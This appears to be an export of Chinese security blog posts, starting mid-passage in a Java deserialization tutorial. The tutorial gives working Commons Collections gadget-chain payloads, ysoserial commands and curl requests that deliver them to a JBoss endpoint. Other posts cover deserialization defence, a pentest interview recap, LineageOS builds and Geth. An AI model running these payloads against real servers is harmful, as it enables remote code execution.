具体来说，对于每个put进来的value——更准确的说是setValue()——都会触发TransformedMap.checkSetValue()： 该操作最终触发invokerTransformer.transform()： invokerTransformer.transform()演示： 12345678// InvokerTransformer UsageInvokerTransformer invokerTransformer1 = new InvokerTransformer( "concat", new Class[]&#123;String.class&#125;, new Object[]&#123;"transformed"&#125; );Object result = invokerTransformer1.transform("raw") ;System.out.printf(result.toString());// 输出 rawtransformed 使用transform弹出计算器如果我们transform的对象就是Runtime，那情况就很好办了，直接调用它的exec(“calc”)方法就行了： 构造Transformer链但是TransformedMap正常情况下不会去放Runtime类型（就像文章开头代码那样，可能是字符串或其他类型），那么就需要构造一个Transformer链，先获得Runtime类，再执行exec()方法。 这里需要用到另一个Transformer类——ConstantTransformer，它的功能是直接将key/value替换成另一个对象： 如上图所示，这里我们还是用了一个TransformerChain，TransformedMap允许我们定义一个Transformer链，上一个Transformer的结果再传递给下一个Transformer，这样我们就可以构造一个恶意的链来弹计算器了： 123456789101112131415161718192021222324252627public class EvilTransformer2 &#123; public static void main(String[] args) &#123; // InvokerTransformer Usage Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); Transformer[] evilTransformers = new Transformer[]&#123; // Runtime new ConstantTransformer(Runtime.class), // (Method)Runtime.class.getMethod("getRuntime", null) new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", null&#125;), //getMethod(函数名，返回值类型) // (java.lang.Runtime)Runtime.class.getMethod("getRuntime", null).invoke(null, null) new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //invoke(函数名，函数参数) // (java.lang.ProcessImpl) // Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc") new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;), &#125;; Transformer evilTransformerChain = new ChainedTransformer(evilTransformers); Map transformMap = TransformedMap.decorate(map, null, evilTransformerChain); transformMap.put("key1", "value1"); transformMap.forEach((key, value) -&gt; System.out.println(key + ":" + value + "\n")); &#125;&#125; 整个Chain实际上就是执行 1Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc") 同样可以弹出计算器。 Annotation Invocation Handler假设有一个不安全的反序列化函数，我们如何借助Apache Commons Collections进行命令执行呢？ 我们知道我们传入的类必须是程序里面已经存在的类（这已经在第一篇里验证），因此我们就需要找一个类，它满足两个条件：1）该类存在于那个不安全的反序列化应用中；2）该类的readObject()调用了先前讨论的transformMap.checkSetValue()。这样我们就可以在构造一个恶意类让其反序列化，接着它调用setValue方法，就可以执行我们的代码了。 于是我们的目光转移到了Annotation Invocation Handler，可以看到在其属性memberValues不为空的情况下，会执行setValue方法： 注意：高版本的java已经修复了这一问题，如需复现使用jdk8u66及以前版本 1234567891011121314151617181920212223242526272829303132333435363738394041class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123; private final Class&lt;? extends Annotation&gt; type; private final Map&lt;String, Object&gt; memberValues; AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123; this.type = type; this.memberValues = memberValues; &#125; //... private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; all bets are off return; &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; // 此处触发一系列的Transformer memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + "[" + value + "]").setMember( annotationType.members().get(name))); &#125; &#125; &#125;&#125; 于是我们可以实例化一个AnnotationInvocationHandler类，先设置一个不为空的map，再将其用先前的Transformer装饰，再将其序列化，给不安全的反序列化函数读取，这样就可以进行任意代码执行了： 考虑通过if (memberType != null),经过事后调试可以知道memberTypes中存在一个&lt;&quot;value&quot;, java.lang.annotation.RetentionPolicy&gt;的键值对，所以我们构造payload时，需要保证name=&quot;value&quot;即key=“value&quot;。 考虑通过第二个if (!(memberType.isInstance(value) ||value instanceof ExceptionProxy))，即保证两者都不满足，这很简单，传入的map中value不要是以上两种类型即可。 根据上述思路，可以产生如下payload： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Retention;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class PayloadTransformedMap &#123; public static void main(String[] args) throws Exception &#123; final Transformer[] evilTransformers = new Transformer[]&#123; // Runtime new ConstantTransformer(Runtime.class), // (Method)Runtime.class.getMethod("getRuntime", null) new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", null&#125;), //getMethod(函数名，返回值类型) // (java.lang.Runtime)Runtime.class.getMethod("getRuntime", null).invoke(null, null) new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //invoke(函数名，函数参数) // (java.lang.ProcessImpl) // Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc") new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;), &#125;; Transformer evilTransformerChain = new ChainedTransformer(evilTransformers); Map innermap = new HashMap(); innermap.put("value", "value"); Map outermap = TransformedMap.decorate(innermap, null, evilTransformerChain); Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); //返回"sun.reflect.annotation.AnnotationInvocationHandler"对象 Object instance = ctor.newInstance(Retention.class, outermap); FileOutputStream fos = new FileOutputStream("payload.ser"); ObjectOutputStream out = new ObjectOutputStream(fos); out.writeObject(instance); out.flush(); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream("payload.ser")); Object o=in.readObject(); in.close(); payloadTest(); &#125; public static void payloadTest() throws Exception &#123; // 这里为测试上面的tansform是否会触发payload // Map.Entry onlyElement =(Entry) outmap.entrySet().iterator().next(); // onlyElement.setValue("foobar"); ObjectInputStream in = new ObjectInputStream(new FileInputStream("payload.ser")); in.readObject(); in.close(); &#125;&#125; 运行代码，得到反序列化文件payload.ser。 JBoss下面找一个不安全的反序列化入口吧，一般Java的RMI（远程方法调用）或是其他服务都不免用到反序列化。在org.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:106)就存在一个不安全的反序列化入口： 在JBoss网站http://jbossas.jboss.org/downloads/上下载一个存在漏洞的jboss（以版本6.1为例），在虚拟机中安装一个低版本的java（8u66)，再运行jboss 1PS C:\Users\anemone\Desktop\jboss-6.1.0.Final\bin&gt; ./run.bat -b 0.0.0.0 接着尝试触发Payload，这里假设server地址为192.168.80.141： 1λ curl http://192.168.80.141:8080/invoker/readonly --data-binary @payload.ser 可以看到计算器被弹出。 面向属性编程——POP它类似于ROP（面向返回编程），搞PWN的都知道为了绕过堆栈不可执行往往会利用一些程序中已有的代码片段（gadgets)，将这些片段拼凑起来形成gadgets chain完成功能。 POP 的gadgets chain寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。以前面讲到的POC来说，构造的POP gadgats链为： 12345678910111213141516Gadget chain:ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() AbstractInputCheckedMapDecorator$MapEntry.setValue() TransformedMap.checkSetValue() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() CommonsCollections6 &amp; LazyMapjava的高版本（8u151+）修改了AnnotationInvocationHandler，导致我们的POP链失效，这时我们就要寻找新的POP，不过原理都是一样的。 CommonsCollections6这里我们使用ysoserial工具的CommonsCollections6 POP链生成Payload，可以exploit。 12λ java -jar ysoserial.jar CommonsCollections6 "calc" &gt; payload.serλ curl http://127.0.0.1:8080/invoker/readonly --data-binary @payload.ser Payload可以看到序列化对象的Payload为CommonsCollections6.java，改写一下变成： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.HashSet;import java.util.Map;public class PayloadLazyMap &#123; public static void main(String[] args) throws Exception &#123; final Transformer[] evilTransformers = new Transformer[]&#123; // Runtime new ConstantTransformer(Runtime.class), // (Method)Runtime.class.getMethod("getRuntime", null) new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", null&#125;), //getMethod(函数名，返回值类型) // (java.lang.Runtime)Runtime.class.getMethod("getRuntime", null).invoke(null, null) new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //invoke(函数名，函数参数) // (java.lang.ProcessImpl) // Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc") new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;), &#125;; Transformer evilTransformerChain = new ChainedTransformer(evilTransformers); final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, evilTransformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo"); HashSet hashSet = new HashSet(1); hashSet.add("nonce"); Field hashSetMapField = null; try &#123; hashSetMapField = HashSet.class.getDeclaredField("map"); &#125; catch (NoSuchFieldException e) &#123; hashSetMapField = HashSet.class.getDeclaredField("backingMap"); &#125; hashSetMapField.setAccessible(true); HashMap innerHashMap = (HashMap) hashSetMapField.get(hashSet); Field hashMapTableField = null; try &#123; hashMapTableField = HashMap.class.getDeclaredField("table"); &#125; catch (NoSuchFieldException e) &#123; hashMapTableField = HashMap.class.getDeclaredField("elementData"); &#125; hashMapTableField.setAccessible(true); Object[] array = (Object[]) hashMapTableField.get(innerHashMap); Object node = array[0]; if(node == null)&#123; node = array[1]; &#125; Field keyField = null; try&#123; keyField = node.getClass().getDeclaredField("key"); &#125;catch(Exception e)&#123; keyField = Class.forName("java.util.MapEntry").getDeclaredField("key"); &#125; keyField.setAccessible(true); keyField.set(node, entry); FileOutputStream fos = new FileOutputStream("payload.ser"); ObjectOutputStream out = new ObjectOutputStream(fos); out.writeObject(hashSet); out.flush(); out.close(); payloadTest(); &#125; public static void payloadTest() throws Exception &#123; ObjectInputStream in = new ObjectInputStream(new FileInputStream("payload.ser")); in.readObject(); in.close(); &#125;&#125; 反序列化后弹出计算器，说明我们POP构造成功 POP链分析它的POP链为 123456789101112Gadget chain: java.io.ObjectInputStream.readObject() java.util.HashSet.readObject() java.util.HashMap.put() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() HashSet先看HashSet: 1234567891011121314151617181920212223public class HashSet&lt;E&gt; extends AbstractSet&lt;E&gt; implements Set&lt;E&gt;, Cloneable, java.io.Serializable&#123; private transient HashMap&lt;E,Object&gt; map; //... public HashSet(int initialCapacity) &#123; map = new HashMap&lt;&gt;(initialCapacity); &#125; private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; // Create backing HashMap map = (((HashSet&lt;?&gt;)this) instanceof LinkedHashSet ? new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) : new HashMap&lt;E,Object&gt;(capacity, loadFactor)); //... // Read in all elements in the proper order. for (int i=0; i&lt;size; i++) &#123; @SuppressWarnings("unchecked") E e = (E) s.readObject(); map.put(e, PRESENT); //Notice this &#125; &#125;&#125; 它内部存在一个HashMap，因为HashSet本身的实现原理就是利用HashMap，在新元素e加入Set时，实际上在HashMap中保存。 在反序列化的时候，同样也会将对象加入这个HashMap，我们需要利用的就是map.put(e, PRESENT)这句话，在调试时，可以看到e对象是一个TiedMapEntry对象，key=foo，value=ProcessImpl： key很好理解，但是value为什么是ProcessImpl？这还要再向下看： HashMapHashMap.put()调用了hash方法： hash方法调用了key.hashCode()方法，根据Gadgets链可以猜测我们的key.hashCode()实际上是TiedMapEntry.hashCode()： org.apache.commons.collections.keyvalue.TiedMapEntry继续跟进，就到了TiedMapEntry的hashCode()方法了，简单介绍一下TiedMapEntry，它继承了普通的Entity类（就是高级for循环用到的那个），其构造方法是TiedMapEntry(Map&lt;K,V&gt; map, K key)。 这里需要利用它的hashCode()方法： 以及其调用的getValue()方法，可以看到它实际调用的是LazyMap.get()方法： org.apache.commons.collections.keyvalue.LazyMap终于！！！我们到了链的最底端，LazyMap.get()，LazyMap基于Map，Map一开始不放元素，只有在get()时才会通过之前定义的factory添加元素（这里的factory可以使Transformer类型）。我的断点没办法在序列化时捕捉if里面的语句，好像是因为调试器会在调试语句前执行该语句的原因，不过这个在先前文章(Commons Collections Java反序列化漏洞深入分析)都介绍过，这里写一个demo模拟一下： 12345678910111213141516171819202122232425public class LazyMapDemo &#123; public static void main(String[] args) &#123; final Transformer[] evilTransformers = new Transformer[]&#123; // Runtime new ConstantTransformer(Runtime.class), // (Method)Runtime.class.getMethod("getRuntime", null) new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", null&#125;), //getMethod(函数名，返回值类型) // (java.lang.Runtime)Runtime.class.getMethod("getRuntime", null).invoke(null, null) new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //invoke(函数名，函数参数) // (java.lang.ProcessImpl) // Runtime.class.getMethod("getRuntime", null).invoke(null,null).exec("calc") new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc"&#125;), &#125;; Transformer evilTransformerChain = new ChainedTransformer(evilTransformers); final Map innerMap = new HashMap(); final Map lazyMap = LazyMap.decorate(innerMap, evilTransformerChain); lazyMap.get('a'); &#125;&#125; 执行结果： 参考资料 Commons Collections Java反序列化漏洞深入分析 JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用 ysoserial]]></content>
      <categories>
        <category>Web安全-反序列化</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java反序列化1：基础]]></title>
    <url>%2F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[java反序列化应该算是java web中最有代表性的一类安全性问题了，因为之前面试也被问到过，这两天好好研究一下。 Demo代码参考”Java反序列化漏洞从入门到深入”一文，具体流程为：1）序列化不安全的类（攻击者所要做的）；2）脆弱程序反序列化不安全的类；3）恶意代码被执行。 1234567891011121314151617181920212223242526272829303132333435import java.io.*;public class VulnSerialize &#123; public static void main(String args[]) throws Exception&#123; //定义myObj对象 MyObject myObj = new MyObject(); myObj.name = "hi"; //创建一个包含对象进行反序列化信息的"object"数据文件 FileOutputStream fos = new FileOutputStream("object.ser"); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()方法将myObj对象写入object文件 os.writeObject(myObj); os.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream("object.ser"); // AntObjectInputStream ois = new AntObjectInputStream(fis); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象，反序列化使用readObject获取对象，这里调用了已经被重写的函数 MyObject objectFromDisk = (MyObject)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); &#125;&#125;class MyObject implements Serializable &#123; public String name; //重写ObjectInputStream.readObject()方法，Java会优先调用重写的readObject()方法。 private void readObject(java.io.ObjectInputStream in) throws Exception&#123; //执行默认的readObject()方法 in.defaultReadObject(); //执行打开计算器程序命令 Runtime.getRuntime().exec("calc"); &#125;&#125; 结果分析可以看到，VulnSerialize.main()中反序列化一个不安全的类MyObject，该类重写了ObjectInputStream.readObject()(面向对象的多态性)使其弹出计算器，又因为反序列化时，Java会调用ObjectInputStream类的readObject()方法，如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法，因此造成任意代码执行。 注意一点是我们只能反序列化已知的类，具体来说，如果我们的程序中没有MyObject类，那么反序列化会爆出ClassNotFound异常，这也是反序列化漏洞需要构造POP的根本原因，这个在之后的文章会说。 防御方式防御方法在Java反序列化漏洞从入门到深入一文中介绍了很多种，但是基本原理都是通过白/黑名单对反序列化的类进行控制。这里介绍一种由IBM的研究人员Pierre Ernst在《Look-ahead Java deserialization》中提出的重写ObjectInputStream.resolveClass()对反序列化的类进行白名单/黑名单控制的方法。 1234567891011121314151617181920class AntObjectInputStream extends ObjectInputStream&#123; public AntObjectInputStream(InputStream inputStream) throws IOException &#123; super(inputStream); &#125; /** * 只允许反序列化VulnSerialize类 */ @Override protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException &#123; if (!desc.getName().equals(VulnSerialize.class.getName())) &#123; throw new InvalidClassException( "Unauthorized deserialization attempt", desc.getName()); &#125; return super.resolveClass(desc); &#125;&#125; 使用AntObjectInputStream反序列化则不会弹出计算器，因为我们只允许反序列化VulnSerialize类：]]></content>
      <categories>
        <category>Web安全-反序列化</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[山石网科web安全工程师面试复盘]]></title>
    <url>%2F%E9%9D%A2%E8%AF%95-%E5%B1%B1%E7%9F%B3%E7%BD%91%E7%A7%91web%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98%2F</url>
    <content type="text"><![CDATA[上周无意在BOSS直聘上发了简历，结果山石网科来电话面试。当时晚上八点，我正在回家的地铁上，很冷，又因为第一次面试有点紧张，自己感觉很多问题答得不好，这里尽量回忆面试内容，希望下次能够做好准备。 Q1：说一下渗透一个网站的具体流程首先信息收集，判断网站是否有CDN，接着了解整个网站的工作流程，接着扫描端口，看看有什么弱服务，比如Redis弱口令，接着我会找逻辑漏洞，比如说密码重置。（最重要的OWASP TOP 10居然忘了讲） Q2：说一下如何绕过CDN可以暴力扫描全网；寻找上传服务，抓包；寻找邮件服务，看IP。（应该还有很多的，比如说看DNS历史解析记录） Q3：说一下Redis漏洞如何利用当时我只说了一个写webshell的，但是如果redis权限够大的话还可以写contrab或是sshkey。 Q4：说一下对于不同web容器，如何利用文件上传漏洞nginx用00或换行截断，IIS用;隔开（忘记讲apache用多重文件名绕过） Q5：简要介绍一下盲注盲注分为基于时间的盲注和基于bool的盲注，一个是通过等待时间判断一个字符的ascii码，一个是通过返回现象判断字符的ascii码。 Q6：你在SQL注入时经常用到哪些函数？这题目搞得我眼前一黑，我经常用的难道不是UNION SELECT这种操作符么Orz，然后我就讲了length，if，substring，ascii，其他的一时半会实在想不起来。现在想想其实还有很多，比如报错的函数EXTRACTVALUE、连接函数concat等。 Q7：在注入时遇到WAF怎么办？讲了一种利用fuzz绕过安全狗的思路，不知道考官听懂没有T_T Q8：了解PHP的文件包含吗？不了解。 Q9：了解反序列化吗？不了解。（反序列化真得好好看看，不仅考官问得多，各种语言好像都有着类问题） Q10：说一下你印象最深的渗透经历这里我感觉答得还可以，讲了一个通过Docker Remote API getshell的经历。 Q11：既然你谈到了Docker，那么Docker file的RUN，ENTRYPOINT和CMD有什么区别？docker file的RUN命令只在构建镜像时运行，ENTRYPOINT和CMD命令均在利用镜像实例化容器时运行，在实例化时输入新命令会覆盖掉CMD命令，而若使用ENTRYPOINT命令时，新的命令会作为参数接在ENTRYPOINT命令后面。 Q12：擅长什么语言擅长Python，Java和PHP能看得懂。 Q13：用Python写过什么项目吗用Python写过一个APK安全扫描框架，blablabla… Q14：打过CTF吗？说一说比赛经验？也就随便说说了。 其他问题包括什么时候可以实习？以后想做哪一块，web or bin？（我也不知道既然凉了为啥要问这种问题Orz）？有什么想要问面试官的？]]></content>
      <categories>
        <category>面经</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>面经</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LineageOS源代码编译笔记]]></title>
    <url>%2Fandroid-LineageOS%E6%BA%90%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[在研究安卓安全时，很多情况下我们需要修改安卓源代码（如动态调试时过掉反调试机制）。LineageOS是根据Android官方源码修改后的版本，对很多手机都适配，因此编译该版本的源码比直接编译AOSP的更加有意义。本文简要说明一下编译LineageOS的步骤。更详细的步骤说明请参考官方文档: https://wiki.lineageos.org/build_guides.html 首先说明一下我这的操作系统和需要编译的LineageOS版本操作系统版本：1Linux anemone-VirtualBox 4.13.0-26-generic #29~16.04.2-Ubuntu SMP Tue Jan 9 22:00:44 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 编译的LineageOS版本1234567891011121314151617181920212223242526============================================PLATFORM_VERSION_CODENAME=RELPLATFORM_VERSION=7.1.2LINEAGE_VERSION=14.1-20180325-UNOFFICIAL-makoTARGET_PRODUCT=lineage_makoTARGET_BUILD_VARIANT=userdebugTARGET_BUILD_TYPE=releaseTARGET_BUILD_APPS=TARGET_ARCH=armTARGET_ARCH_VARIANT=armv7-a-neonTARGET_CPU_VARIANT=kraitTARGET_2ND_ARCH=TARGET_2ND_ARCH_VARIANT=TARGET_2ND_CPU_VARIANT=HOST_ARCH=x86_64HOST_2ND_ARCH=x86HOST_OS=linuxHOST_OS_EXTRA=Linux-4.13.0-26-generic-x86_64-with-Ubuntu-16.04-xenialHOST_CROSS_OS=windowsHOST_CROSS_ARCH=x86HOST_CROSS_2ND_ARCH=x86_64HOST_BUILD_TYPE=releaseBUILD_ID=NJH47FOUT_DIR=/media/anemone/lineage/lineageOS/outWITH_SU=true============================================ 顺带可以看到我这里需要编译的Android版本是7.1.1, 目标设备是Nexus4手机。 搭建编译环境安装jdk12sudo apt-get updatesudo apt-get install openjdk-8-jdk 安装编译时需要依赖的库1sudo apt-get install bc bison build-essential curl flex g++-multilib gcc-multilib git gnupg gperf imagemagick lib32ncurses5-dev lib32z1-dev libesd0-dev liblz4-tool libncurses5-dev libsdl1.2-dev libwxgtk3.0-dev libxml2 libxml2-utils lzop pngcrush schedtool squashfs-tools xsltproc zip zlib1g-dev openjdk-8-jdk lib32readline6-dev 下载源代码安装repo工具12curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo -o repochmod +x repo 为了方便可以将其拷贝到你的PATH里。 使用repo命令下载源代码（可能涉及到科学上网）12repo init -u git://github.com/LineageOS/android.git -b cm-14.1repo sync -f --force-sync --no-clone-bundle 提取设备文件虽然Android是开源的，但是有些设备的文件不是通用的（如不开源的驱动文件），有2种方法提取：1，从刷好相同版本的LineageOS设备中获取，2，从已经编译好的LineageOS卡刷包中获取。这里介绍第二种，假设我们已经下好的卡刷包为path/to/lineage-xxx.zip。 12345678mkdir ~/android/system_dump/cd ~/android/system_dump/unzip path/to/lineage-*.zip system.transfer.list system.new.datgit clone https://github.com/xpirt/sdat2imgpython sdat2img/sdat2img.py system.transfer.list system.new.dat system.imgmkdir system/sudo mount system.img system/./extract-files.sh ~/android/system_dump/ 将system_dump文件下的文件复制到~/android/lineage/vendor/lge文件夹下。 编译准备工作做完后就可以开始愉快的编译啦~~，不过在由于Android工程巨大，请确保编译的机器拥有不低于10G的内存(亲测虚拟机内存8G，swap 8G可以编译)，一个速度足够快的硬盘（再来一个固态当缓冲就更好啦），当然还有一个好的CPU（我这用的是i7-4700HQ, 应该算比较差的编译环境了，整个编译过程需要3个小时）。12345678. build/envsetup.shexport WITH_SU=true #自带rootexport JACK_SERVER_VM_ARGUMENTS="-Dfile.encoding=UTF-8 -XX:+TieredCompilation -Xmx10G" #设置编译内存breakfast lineage_mako-userdebug #选择设备内核export USE_CCACHE=1 #使用缓存export CCACHE_DIR=/media/anemone/anemone_ssk/ccache #缓存地址./prebuilts/misc/linux-x86/ccache/ccache -M 100G #使用100G作为缓存空间brunch lineage_mako-userdebug]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Geth搭建公有节点or私有链节点]]></title>
    <url>%2F%E5%8C%BA%E5%9D%97%E9%93%BE-Geth%E6%90%AD%E5%BB%BA%E5%85%AC%E6%9C%89%E8%8A%82%E7%82%B9or%E7%A7%81%E6%9C%89%E9%93%BE%2F</url>
    <content type="text"><![CDATA[Geth搭建公有节点Geth搭建公有节点主要是因为实验室有获取区块数据这一需求，因此这里记录一下如何建立一个公有链节点并暴露其json-rpc供其他人调用： 1geth --syncmode=light --datadir "./public_chain" --rpc --rpcaddr "127.0.0.1" --rpcport "8545" —syncmode=light：仅获取当前状态，需要其他信息向其他full节点请求（其他模式还有：full——全节点模式，下载所有区块header&amp;body，并且验证，fast——快速模式，下载所有区块，但不验证） —datadir “./public_chain”：保存数据在”./public_chain” —rpc -rpcaddr “127.0.0.1” —rpcport “8545”：开放127.0.0.1:8545的JSON-RPC访问 尝试RPC访问 查询版本： 12$ curl -H "Content-Type: application/json" -X POST --data '&#123;"jsonrpc":"2.0","method":"web3_clientVersion","params":[],"id":67&#125;' http://127.0.0.1:8545&#123;"jsonrpc":"2.0","id":67,"result":"Geth/v1.8.13-stable-225171a4/windows-amd64/go1.10.3"&#125; 查询区块： 12$ curl -H "Content-Type: application/json" -X POST --data '&#123;"jsonrpc":"2.0","method":"eth_syncing","params":[],"id":1&#125;' http://127.0.0.1:8545&#123;"jsonrpc":"2.0","id":1,"result":&#123;"currentBlock":"0x6a563f","highestBlock":"0x6a9987","knownStates":"0x0","pulledStates":"0x0","startingBlock":"0x687fff"&#125;&#125; 详细API请参阅https://github.com/ethereum/wiki/wiki/JSON-RPC#json-rpc-api 如果没有区块信息需要将static-nodes.json放在chain_data目录下： https://ethfans.org/wikis/%E6%98%9F%E7%81%AB%E8%8A%82%E7%82%B9%E8%AE%A1%E5%88%92%E8%B6%85%E7%BA%A7%E8%8A%82%E7%82%B9%E5%88%97%E8%A1%A8 Geth搭建私有链目前网上写的私有链搭建的步骤均没有介绍如何初始化账户及初始金额的问题，本文记录一下使用Geth构造一个私有链的完整步骤。 0x01 创建新账户如果需要在私有链上初始化一些账户以及给这些账户发放一定数量的以太币，就需要新建一些账户。使用account new命令新建账户： 1234567891011$ mkdir testchain # 新建一个文件夹放置数据$ geth --datadir "./testchain" account new # 新建账户，需要设置密码WARN [10-23|20:08:07] No etherbase set and no accounts found as defaultYour new account is locked with a password. Please give a password. Do not forget this password.Passphrase:Repeat passphrase:Address: &#123;28c67f4a957fcd814effce00863eb3aeb9e9884a&#125;$ ls ./testchainkeystore$ ls ./testchain/keystore/ # 账户文件UTC--2018-10-23T12-08-15.951611300Z--28c67f4a957fcd814effce00863eb3aeb9e9884a 0x02 编写配置文件在testchain目录下新建genesis.json文件，内容如下： 12345678910111213141516&#123; &quot;config&quot;:&#123; &quot;homesteadBlock&quot;:0 &#125;, &quot;nonce&quot;: &quot;0x0000000000000042&quot;, &quot;timestamp&quot;: &quot;0x0&quot;, &quot;parentHash&quot;: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;, &quot;extraData&quot;: &quot;0x&quot;, &quot;gasLimit&quot;: &quot;0x8000000000000000&quot;, &quot;difficulty&quot;: &quot;0x02&quot;, &quot;mixhash&quot;: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;, &quot;coinbase&quot;: &quot;0x28c67f4a957fcd814effce00863eb3aeb9e9884a&quot;, &quot;alloc&quot;: &#123; &quot;0x28c67f4a957fcd814effce00863eb3aeb9e9884a&quot;:&#123;&quot;balance&quot;:&quot;2000000000000000000000000&quot;&#125; &#125;&#125; 其中，coinbase指挖矿的报酬发送到的账户，alloc指初始化账户及其初始金额，注意这里的地址都需要是新建的账户；difficulty指挖矿难度，gasLimit指一个区块中的Gas限制，即打包区块时所有的交易Gas花费不得超过该值。 0x03 使用命令构造创始块若文件夹下有旧区块信息需要先删除： 1geth --datadir "./testchain" removedb 使用genesis.json创建创始块 1geth --datadir "./testchain" init ./testchain/genesis.json 0x04 启动节点创始块完成后可以使用geth启动节点并开始挖矿了，具体命令如下： 1geth --syncmode=full --identity "TestNode0" --rpc -rpcaddr 